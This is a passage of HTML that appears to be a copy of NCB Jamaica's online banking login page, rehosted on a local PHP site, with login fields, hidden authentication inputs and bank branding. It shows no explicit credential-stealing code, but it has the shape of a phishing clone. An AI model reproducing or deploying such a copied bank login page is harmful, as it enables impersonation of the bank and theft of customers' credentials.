            
            
            
          <p id="LoginHDisplay.R1">
<span id="LoginHDisplay.R1.C1"><span class="null" id="loginScreenMessage">For more details, call us toll free at 1-888-NCB-FIRST (1-888-622-3477) or message us at ncbinfo@jncb.com</span></span></p>

	  

</div>

   </div>
<!--end of subsection--> <script src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Chart.js"></script>
      
     <div class="login-main">
     <div class="login-card">
     <div class="px-4">
     <div class="row-login">
     
      <div class="login-card-header col-sm-4"><div class="py-4 px-3" id="LoginHDisplay.LoginRowset1">
      <img src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/logo-white-text.png" class="login-logo" alt="ncb logo">


             
            
     

              <div class="text-light text-xl fix-to-bottom-sm font-weight-light px-4 py-0 py-sm-4 ">Welcome!
 				<div class="login-tip"></div>

</div>
        </div>


</div>

           
        <div class="login-card-body col-login material"><div class="px-5 pt-3 pb-4" id="LoginHDisplay.LoginRowset2">
         <div class="text-brand mb-3 text-xl font-weight-light">Log In</div> 
         
                                                
        
        


      

	
            


              		




<!--           <label class="text-sm text-muted">Username</label> -->


          
           
          <div id="LoginHDisplay.Ra10" class="group">
<span id="LoginHDisplay.Ra10.C1"><span class=""><input type="text" name="AuthenticationFG.USER_PRINCIPAL" size="28" "="" class="login_user type_UserPrincipal ui-autocomplete-input" data-febatype="UserPrincipal" maxlength="65" id="AuthenticationFG.USER_PRINCIPAL" required="" ondragstart="return false" ondrop="return false" autocomplete="off"><i class="fas fa-user float-right"></i><span class="highlight"></span><span class="bar"></span><label for="AuthenticationFG.USER_PRINCIPAL" id="UserId_Text" class="text-sm text-muted label-user">Username<span class="redstar">*</span></label></span></span></div>  
   
          
         
           
          
          








           
            
              
            
          
          
          
            
              
            
            
            
            
               
            
          
          
            

		                
              	
          				   

            
          
          
		  
           
           	
                	
            		
             	
           
          <div id="LoginHDisplay.Ra81" class="dummyPasswordField stage3_inputpanel_paydetailsrow loginPanelInputDetailsrow padding_top_style">
<span id="LoginHDisplay.Ra81.C1" class="leftColumnStyle loginPanelColumnDetailStyle"><div id="F1" class="containerStyle"><input autocomplete="new-password" type="password" name="dummy1" size="28" class="loginPanelTextboxMediumStyle null" id="dummy1" onfocus="settingPinPadCtlOnFocus(this,2,'dummy1'),fixedDisplay(this.id);" maxlength="128" ondragstart="return false" ondrop="return false" value="dummy"><input type="Hidden" name="MIN_LENGTH_OF_PASSWORD" value="8" id="MIN_LENGTH_OF_PASSWORD" ondragstart="return false" ondrop="return false"><input type="Hidden" name="PWD_SPECIAL_CHAR_MANDATORY" value="Y" id="PWD_SPECIAL_CHAR_MANDATORY" ondragstart="return false" ondrop="return false"><input type="Hidden" name="PWDDIGITMAND" value="Y" id="PWDDIGITMAND" ondragstart="return false" ondrop="return false"><input type="Hidden" name="PASSWORD_STRENGTH" value="Too short|Weak|Fair|Strong|Very Strong" id="PASSWORD_STRENGTH" ondragstart="return false" ondrop="return false"><input type="Hidden" name="IMAGE_PATH" value="L001/consumer/images" id="IMAGE_PATH" ondragstart="return false" ondrop="return false"><label for="dummy1" id="label_access_code" class="loginPanelSimpleTextStyle active">Password<span class="redstar">*</span></label></div></span></div> 







           
            
              
            
            
              
                
                
              
            
          <div id="LoginHDisplay.Ra12" class="group customCheckBoxLogin">
<span id="LoginHDisplay.Ra12.C1"><input type="checkbox" name="AuthenticationFG.REMEMBER_USER_ID" value="Y" class="loginPanelCheckBox  filled-in" id="AuthenticationFG.REMEMBER_USER_ID" title="Remember User ID" onclick="handleRememberUserId(event);" ondragstart="return false" ondrop="return false"><span class="span-checkbox"></span></span><span id="LoginHDisplay.Ra12.C2"><span class="loginPanelSimpleTextStyle_remUserId " id="Remember_UserId_Label">Remember Me</span><img src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/logininfo.png" alt="Remember Username" title="Remember Username" class="loginPanelInfo" id="remember_user_info" onclick="handleRememberUserIdInfoClick(event);" border="0"></span></div> 
          
	             
	  
	                  	
	  
	  
	             
          






              			



          
           
           	
                	
            		
             	
           
          <div id="LoginHDisplay.Ra82" class="dummyPasswordField stage3_inputpanel_paydetailsrow loginPanelInputDetailsrow padding_top_style">
<span id="LoginHDisplay.Ra82.C1" class="leftColumnStyle loginPanelColumnDetailStyle"><div id="F1" class="containerStyle"><input autocomplete="new-password" type="password" name="dummy2" size="28" class="loginPanelTextboxMediumStyle null" id="dummy2" onfocus="settingPinPadCtlOnFocus(this,2,'dummy2'),fixedDisplay(this.id);" maxlength="128" ondragstart="return false" ondrop="return false" value="dummy"><input type="Hidden" name="MIN_LENGTH_OF_PASSWORD" value="8" id="MIN_LENGTH_OF_PASSWORD" ondragstart="return false" ondrop="return false"><input type="Hidden" name="PWD_SPECIAL_CHAR_MANDATORY" value="Y" id="PWD_SPECIAL_CHAR_MANDATORY" ondragstart="return false" ondrop="return false"><input type="Hidden" name="PWDDIGITMAND" value="Y" id="PWDDIGITMAND" ondragstart="return false" ondrop="return false"><input type="Hidden" name="PASSWORD_STRENGTH" value="Too short|Weak|Fair|Strong|Very Strong" id="PASSWORD_STRENGTH" ondragstart="return false" ondrop="return false"><input type="Hidden" name="IMAGE_PATH" value="L001/consumer/images" id="IMAGE_PATH" ondragstart="return false" ondrop="return false"><label for="dummy2" id="label_access_code" class="loginPanelSimpleTextStyle active">Access Code<span class="redstar">*</span></label></div></span></div> 
		  
          
          
          
            
            
            
           
            		
            
            
            
            
           
            	
            		
            
            
          
            
              

				
                
                
                
                
              
            
            
              
            
          <div id="LoginHDisplay.Ra25" class="loginrow loginButtonPanel">
<span id="LoginHDisplay.Ra25.C1"><span class=""><i class="waves-effect waves-light btn login_button waves-input-wrapper lo" style=""><input type="Submit" name="Action.STU_VALIDATE_CREDENTIALS" class="waves-button-input" id="STU_VALIDATE_CREDENTIALS" value="Continue" ondragstart="return false" ondrop="return false"></i></span></span></div> 
          
          
          	  
              
			  
			
            
              
            
          <p id="LoginHDisplay.Ra15" class="loginrow">
<span id="LoginHDisplay.Ra15.C3" class="loginPanellabellinkStyle"><span class="login_link_style" id="span_label_new_registration" title="New to online banking"><a href="https://retail.ncbelink.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&amp;__START_TRAN_FLAG__=Y&amp;__EVENT_ID__=LOAD&amp;ACTION.LOAD=Y&amp;__CALL_MODE__=52&amp;AuthenticationFG.LOGIN_FLAG=1&amp;BANK_ID=077&amp;USER_PRINCIPAL=&amp;REMEMBER_USER_ID=" title="New to online banking" id="label_new_registration" name="HREF_label_new_registration" class="Login_linkstyle" target="_blank">New to online banking</a></span></span><span id="LoginHDisplay.Ra15.C1" class="loginPanellabellinkStyle"><span class="login_link_style" id="span_label_forgot_access_code" title="Forgot Password"><a href="https://retail.ncbelink.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&amp;__START_TRAN_FLAG__=Y&amp;__EVENT_ID__=LOAD&amp;ACTION.LOAD=Y&amp;__CALL_MODE__=51&amp;AuthenticationFG.LOGIN_FLAG=1&amp;BANK_ID=077&amp;USER_PRINCIPAL=&amp;REMEMBER_USER_ID=" title="Forgot Password" id="label_forgot_access_code" name="HREF_label_forgot_access_code" class="Login_linkstyle1" target="_blank">Forgot Password</a></span></span></p>
	
          
        
          
            
              
                
                
                
              
            
          
        
          
            
        
           
          
            
          
        </div>


</div>

         </div>
         </div>
         </div>
         </div>
      </div>
</div>
 <script src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/Chart.js"></script>
      
    
  </div>


  
 
  <input type="Hidden" name="isHorizontalLayout" value="true" id="isHorizontalLayout" ondragstart="return false" ondrop="return false">
  <input type="Hidden" name="FG_BUTTONS__" value="VALIDATE_CREDENTIALS,VALIDATE_EV_AUTH_CREDENTIALS,STU_VALIDATE_CREDENTIALS,VALIDATE_CREDENTIALS_DIG_CERT,BACK,CLEAR_VALUES" id="FGBUTTONS" ondragstart="return false" ondrop="return false">
  <input type="Hidden" name="AuthenticationFG.TRANSACTION_ID" value="887" id="AuthenticationFG.TRANSACTION_ID" ondragstart="return false" ondrop="return false">
  <input type="Hidden" name="AuthenticationFG.IS_FIRST_AUTHENTICATION" value="Y" id="AuthenticationFG.ISFIRSTAUTHENTICATION" ondragstart="return false" ondrop="return false">
  <input type="Hidden" name="QS" value="" id="QS" ondragstart="return false" ondrop="return false">
  <input type="Hidden" name="USER_ID_COOKIE" value="" id="USER_ID_COOKIE" ondragstart="return false" ondrop="return false">
  <input type="Hidden" name="CATEGORY_ID" value="" id="CATEGORYID" ondragstart="return false" ondrop="return false">
  <input type="Hidden" name="userType" value="1" id="userType" ondragstart="return false" ondrop="return false">
  <input type="Hidden" name="AuthenticationFG.PREFERRED_LANGUAGE" value="001" id="AuthenticationFG.PREFERREDLANGUAGE" ondragstart="return false" ondrop="return false">
  <input type="Hidden" name="CAN_USER_SELF_ENABLE" value="" id="CAN_USER_SELF_ENABLE" ondragstart="return false" ondrop="return false">
  <input type="Hidden" name="languageId" value="001" id="languageId" ondragstart="return false" ondrop="return false">
  <input type="Hidden" name="bankId" value="077" id="bankId" ondragstart="return false" ondrop="return false">
 <input type="Hidden" name="FORMSGROUP_ID__" value="AuthenticationFG" id="FORMSGROUP_ID__" ondragstart="return false" ondrop="return false">
 <input type="Hidden" name="AuthenticationFG.REPORTTITLE" value="AuthenticationScreenUX5" id="AuthenticationFG.REPORTTITLE" ondragstart="return false" ondrop="return false">
	
		
		
	<script type="text/javascript">new feba.js.ajax.updateField(
{
isListPaginated: "true",
onComplete: function(){initiateMobileLogin('VALIDATE_MOBILELOGIN1',this);},
executeOnLoad: "false",
eventType: "click",
source: "VALIDATE_MOBILELOGIN",
forcePreventAjaxCall: "AuthenticationFG.USER_PRINCIPAL",
jsVarName: "AuthenticationScreenRetail_VALIDATE_MOBILELOGIN",
baseUrl: "FinacleRiaRequest;jsessionid=0000ymEdq2XgiBAd6a3X01nmrTR:1clmi8n6o?bwayparam=bZwO6rOPIINZnE6rOeJWuhvICEeml%2BDO3rAFVK5W6fEEuFxRYXFfnm9hj9O7iTTqoCR7E2G%2B1rnvS%2Fl%2BBDnLRJ93PzM2Fso5KpdaHliPux2OpTPsCnHX0DoATKj%2FMFaz%0D%0ABLTbL1HiedOzBR0qk4%2FgbQ%3D%3D",
startIndex: "0",
displayExceptions: "true",
forcontrolIDs: "User ID=AuthenticationFG.USER_PRINCIPAL@@Access Code=AuthenticationFG.ACCESS_CODE@@Verification=AuthenticationFG.VERIFICATION_CODE@@null=AuthenticationFG.VERIFICATION_CODE@@Language=AuthenticationFG.PREFERRED_LANGUAGE@@Default Page=AuthenticationFG.MENU_ID@@",
endIndex: "1",
action: "VALIDATE_MOBILELOGIN",
riaFeatureID: "1",
parameters: "AuthenticationFG.SELECTED_AUTH_MODE={AuthenticationFG.SELECTED_AUTH_MODE}",
tagHelper: "UPDATE_FIELD.TagHelper"});
</script><script type="text/javascript">new feba.js.ajax.updateField(
{
isListPaginated: "true",
executeOnLoad: "false",
onComplete: function(){confirmMLGN('','STATUS_MOBILELOGIN','VALIDATE_MOBILELOGIN1',this);},
eventType: "click",
source: "VALIDATE_MOBILELOGIN1",
forcePreventAjaxCall: "AuthenticationFG.USER_PRINCIPAL",
target: "STATUS_MOBILELOGIN=AuthenticationFG.STATUS_MOBILELOGIN",
jsVarName: "AuthenticationScreenRetail_VALIDATE_MOBILELOGIN1",
onBeforeExecute: false,
baseUrl: "FinacleRiaRequest;jsessionid=0000ymEdq2XgiBAd6a3X01nmrTR:1clmi8n6o?bwayparam=bZwO6rOPIINZnE6rOeJWuhvICEeml%2BDO3rAFVK5W6fHy2G0p%2FszjAtwU7UVq6BhaTqD3V2UyIVH6BH8uO21jKrPpR2m4sYAN1G6vod1m%2BZ3C98mZZ7QKcd4OMx77g%2Fq0%0D%0AlxE%2BzLvwLjwlfkIujNDrVZVXaPDmYCsLK6kuDn4HQ3fnTqrHTiGKUR3lgZDt8%2F2MjuXfXQQMyJVxdqRkxuGoIvGpXML%2BFWoWYwkTAONEzDc%3D",
targetsRequired: "AuthenticationFG.STATUS_MOBILELOGIN,,",
startIndex: "0",
displayExceptions: "true",
forcontrolIDs: "User ID=AuthenticationFG.USER_PRINCIPAL@@Access Code=AuthenticationFG.ACCESS_CODE@@Verification=AuthenticationFG.VERIFICATION_CODE@@null=AuthenticationFG.VERIFICATION_CODE@@Language=AuthenticationFG.PREFERRED_LANGUAGE@@Default Page=AuthenticationFG.MENU_ID@@",
endIndex: "1",
action: "VALIDATE_MOBILELOGIN1",
riaFeatureID: "2",
parameters: "AuthenticationFG.SELECTED_AUTH_MODE={AuthenticationFG.SELECTED_AUTH_MODE}",
tagHelper: "UPDATE_FIELD.TagHelper"});
</script>

	<style>
.collapsible-header_pwdscreen {
    margin-top: 20px;
    padding-left: 0px;
    background-color: #00539b;
    color: #ffff;}

.collapsible-header {
    display: inline;
    cursor: pointer;
    min-height: 3rem;
    line-height: 3rem;
    padding: 0 1rem;
    /*background-color: #FFFFFF;*/
    /* border-bottom: 1px solid #ddd; */
    border-bottom: none;
}
.pwdreqtext_pwdscreen {
    font-size: 15px;
    line-height: 1.5;
    color: #000000;
    font-family: "Roboto", sans-serif !important;
    padding-left: 32px;}
    
.queryitalictextwithmargin {
    font-size: 13px;
    color: #424242;
    float: left;
    margin-left: 45px;
    width: 85%;
    word-wrap: break-word;
}
.loginPanelSimpleTextStyle {
    font-size: 14px !important;}
    
input:focus ~ label {
    color: #00539b !important;
}

input[type=password]:focus:not([readonly]){
box-shadow: 0 1px 0 0 #00539b;
    border-bottom: 1px solid #00539b;

}
</style> 
	
	
 









     
      
	

	



	<div id="footer" role="contentinfo" class="footer-wrapper loginfoorter-wrapper">

           
	
	
	
	
	
	 <div class="copyright">
                		Copyright 1999-2018 NCB Jamaica. All Rights Reserved
	</div>
	<div class="footer-links">
                    <ul>
                         <li><a href="https://www.jncb.com/JNCB/media/Main-Librarie/Online%20Banking%20Documents/Personal/Online_Security_Privacy_Policy.pdf" name="HREFPrivacyfooter" target="_blank" id="PrivacyPolicyfooter">Privacy Policy</a></li>
                        <li>|</li>
                        <li><a href="https://www.jncb.com/JNCB/media/Main-Librarie/Online%20Banking%20Documents/Personal/NCB_eFinancial_Services_Terms_Conditions.pdf" name="HREFTermsConditionsfooter" target="_blank" id="TermsCondionsfooter">Terms of Use</a></li>
                    </ul>
                </div>
	
	<div class="footer-links memberOf">
                    <ul>
                         <li><a href="http://localhost:8080/phpSite/canda/#" name="HREFPrivacyfooter" id="PrivacyPolicyfooter">Members of:</a></li>
                    </ul>
    </div>
           
	<div id="footerLoginInner">
		
	
			<!--<span class="footer_firstLine">
				<a href="http://localhost:8080/phpSite/canda/#" name="HREFSitemapfooter" id="Sitemapfooter" class="whitelink_footer">Site Map</a>
				<span class="columnSeparator_login"></span>
					<a href="http://localhost:8080/phpSite/canda/#" name="HREFPrivacyfooter"	id="PrivacyPolicyfooter" class="whitelink_footer">Privacy Policy</a>
				<span class="columnSeparator_login"></span>
					<a href="http://localhost:8080/phpSite/canda/#" name="HREFTermsConditionsfooter" id="TermsCondionsfooter" class="whitelink_footer">Terms & Conditions</a>
				<span class="columnSeparator_login"></span>
					<a href="http://localhost:8080/phpSite/canda/#" name="HREFDisclaimerfooter" id="Disclaimerfooter" class="whitelink_footer">Disclaimer</a>
			</span>
			<p class="simpletext"><span>Copyright &copy; Finacle eBanking, All rights reserved
			</span>
			<p class="simpletext">Powered By
			<span class="footer_secondLine">
			
			<img class="footer_img" src="http://localhost:8080/phpSite/canda/L001/consumer/images/finacle-logo.png" border="0">
			</span>
			</p>
			
		-->
		
</div>
</div>


<script type="text/javascript">
try{
	feba.domManipulator.documentReady(convertComboboxes);
	}catch(e){
	}
</script>



<input type="Hidden" name="RIA_TARGETS" value="STATUS_MOBILELOGIN,,," id="RIA_TARGETS" ondragstart="return false" ondrop="return false"><input type="Hidden" name="JS_ENABLED_FLAG" value="Y" id="JS_ENABLED_FLAG" ondragstart="return false" ondrop="return false"><input type="Hidden" name="DECRYPT_FLAG" value="N" id="DECRYPT_FLAG" ondragstart="return false" ondrop="return false"><input type="Hidden" name="CHECKBOX_NAMES__" value="AuthenticationFG.REMEMBER_USER_ID" id="CHECKBOX_NAMES__" ondragstart="return false" ondrop="return false"><input type="Hidden" name="Requestid" value="1" id="Requestid" ondragstart="return false" ondrop="return false"><script type="text/javascript">feba.js.common.checkJS("JS_ENABLED_FLAG");</script><noscript><BR><CENTER><B>
Your browser is not Javascript enabled. Please enable Javascript for enhanced security.
</B></CENTER></noscript>
<input type="HIDDEN" id="__JS_ENCRYPT_KEY__" name="__JS_ENCRYPT_KEY__" value="10001,9c6d3c245e4db24c7e8459961d2cd4796beea397eeb031f4373930c12f5be5cd20f6c99e1b034119ecbc682c6f3ab870f3db5721f8e9c0095ad14d8f9e6ded45b084a774fccfa7d1b6c4a919f6d8cd2b7586fa390cdd650bad9f9563ff6b0a62e708a800d282b00da001fa466d3805f8c0c96bd40ed503815af864e8abc90375,131" ondragstart="return false" ondrop="return false"><script type="text/javascript">jsVarForControlIds="Access Code=AuthenticationFG.dummy2@@AuthenticationFG.dummy2=Access Code@@Password=AuthenticationFG.dummy1@@AuthenticationFG.dummy1=Password@@"</script><script type="text/javascript">jQuery(function(){RedrawAllTrees();jsonObj={"TypesCatalogue":{"UserPrincipal" : {"LEN":"65",
"JUS":"LEFT_JUSTIFIED",
"CST":"MIXED_CASE",
"CNT":"null",
"SEC":"false",
"BCC":"false",
"PTY": "STR"
}}};init(jsonObj,null,jsVarForControlIds);
feba.js.common.blockOnButtonClicks("loadingImage");
feba.js.common.blockOnHyperlinkClicks("loadingImage");
feba.js.common.runPageCustomFunction("AuthenticationScreenRetail_onload","null");feba.js.common.runModuleCustomFunction("user_onload","null");});</script><script type="text/javascript">doEndBinding();</script><img src="http://localhost:8080/phpSite/canda/NCB%20Personal%20Online%20Banking%20Internet%20Banking%20Login_files/widget-loading.gif" id="loadingImage" style="display:none;"></form>

<div class="hiddendiv common"></div><ul id="ui-id-1" tabindex="0" class="ui-menu ui-widget ui-widget-content ui-autocomplete ui-front" style="display: none;"></ul><div role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div></body></html>
